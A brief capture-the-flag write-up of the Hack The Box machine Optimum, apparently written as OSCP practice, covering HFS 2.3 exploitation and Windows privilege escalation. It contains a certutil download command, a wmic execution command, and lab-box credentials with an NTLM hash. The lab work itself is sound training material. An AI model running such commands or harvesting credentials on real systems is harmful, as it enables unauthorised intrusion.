Name: Optimum
Date:  26/10/2022
Difficulty:  Easy
Goals:  OSCP Prep
Learnt:
- wesng might just be a privesc rabbit hole of doom

## Recon

![ping](HackTheBox/Retired-Machines/Optimum/Screenshots/ping.png)

Firstly reviewing nmap it found HFS 2.3 then quick `searchsploit HFS 2.3` found the below
![](nmaptosearchsploit.png)

## Exploit && Foothold

With some minor configurations the outcome of this script as show below, also it is not slow just requires an press of the  `[RETURN/ENTER]` key to drop into the shell
![](foothold.png)

The kostas user has no token PrivEscs

![900](kostas.png)
      
## PrivEsc

![](tasklistsvcs.png)

[[Optimum-Systeminfo]]

Trusty LOLBAS
```powershell
certutil -urlcache -split -f http://
```

WinPEAS found:
![1000](itsrightthere.png)

![](icaclshfsexe.png)

![](addkostas.png)
But it failed. Returning to this box. This shell is awesome, I cant execute anything. But by the power of red teaming off the land! Use wmic:

```shell-session
wmic.exe process call create C:\users\kostas\desktop
```

![](powerofwmic.png)

```
    Some AutoLogon credentials were found
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS*

kostas::OPTIMUM:1122334455667788:3b3d8bac1f1ab5d127d918b5b40bd363:0101000000000000137b0de881f2d8012d0cb1d6220e22e6000000000800300030000000000000000000000000200000f4b900b0ef6cbf93c4855021fbc634aa7ef004d983943a7377c12abf28167baf0a00100000000000000000000000000000000000090000000000000000000000
```


![](betterwinpeas1.png)


![](vmwareisddangerous.png)